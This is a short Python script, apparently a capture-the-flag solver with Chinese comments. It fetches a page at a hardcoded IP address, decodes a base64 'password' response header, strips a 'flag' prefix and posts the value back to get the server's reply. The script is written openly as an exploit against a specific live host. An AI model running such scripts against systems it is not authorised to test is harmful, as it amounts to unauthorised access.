import requests
import base64

TARGET_URL = "http://124.16.75.117:51007/index.php"

def exploit():
        with requests.Session() as session:
            # 第一次请求（使用stream加速）
            with session.get(TARGET_URL, stream=True) as resp:
                # 快速检查password头
                if 'password' not in resp.headers:
                    print("[-] 响应头中未找到password字段")
                    return
                
                # 获取并解码password
                encoded = resp.headers['password']
                decoded = base64.b64decode(encoded).decode('utf-8')
                
                # 仅去掉"flag"保留大括号
                final_pwd = decoded[4:] if decoded.startswith('flag') else decoded
                print(f"[+] 解码密码: {final_pwd}")

            # 立即用同一会话提交
            resp_post = session.post(
                TARGET_URL,
                data={'password': final_pwd},
                headers={'Connection': 'close'}
            )
            
            print("\n[+] 服务器响应:")
            print(resp_post.text)

if __name__ == "__main__":
    exploit()